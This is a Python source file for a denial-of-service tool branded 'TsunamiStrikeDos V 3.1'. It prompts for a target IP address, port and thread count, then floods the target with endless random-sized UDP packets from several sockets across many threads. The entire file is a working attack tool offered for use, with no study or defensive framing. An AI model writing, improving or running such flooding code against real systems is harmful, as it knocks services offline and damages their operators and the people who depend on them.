import random
import socket
from colorama import Fore
import threading
from concurrent.futures import ThreadPoolExecutor


print(f'''
{Fore.GREEN}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣾⣿⣦⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣽⣿⣷⣴⣤⣤⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣏⣛⣛⣉⣛⡛⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢿⣿⣿⣿⠟⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                {Fore.CYAN} TsunamiStrikeDos {Fore.GREEN}V 3.1 {Fore.RESET}
''')


# Create multiple sockets for better performance
socks = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for _ in range(5)]  # Create 5 UDP sockets

def flood(target):
    while True:  # Continuous loop for sending packets
        try:
            payload = random._urandom(random.randint(1, 1000))  # Generate random payload with size between 1 and 1000 bytes
            sock = random.choice(socks)  # Randomly choose one of the created sockets
            sock.sendto(payload, (target[0], target[1]))  # Send the payload to the target
        except Exception as e:
            print(f"{Fore.RED}Error while sending UDP packet\n{Fore.RED}{e}{Fore.RESET}")
        else:
            print(f"{Fore.GREEN}[DONE] {Fore.YELLOW}UDP Packet Sent! Payload size: {len(payload)}. {Fore.RESET}")

# Parse target input as IP and Port
target_input = input(f'{Fore.CYAN}[?] {Fore.RESET}Target (IP:PORT, ex: 1.1.1.1:80): {Fore.GREEN}')
ip, port = target_input.split(':')
targetIp = (ip, int(port))  # Target IP and Port as a tuple

thread_count = int(input(f'{Fore.CYAN}[?] {Fore.RESET}Thread Count: {Fore.CYAN}'))

# Function to start UDP flooding using ThreadPoolExecutor for better thread management
def start_udp_flooding(target):
    with ThreadPoolExecutor(max_workers=thread_count) as executor:  # Manage threads using ThreadPoolExecutor
        for _ in range(thread_count):
            executor.submit(flood, target)  # Submit each thread for execution

if __name__ == "__main__":
    start_udp_flooding(targetIp)
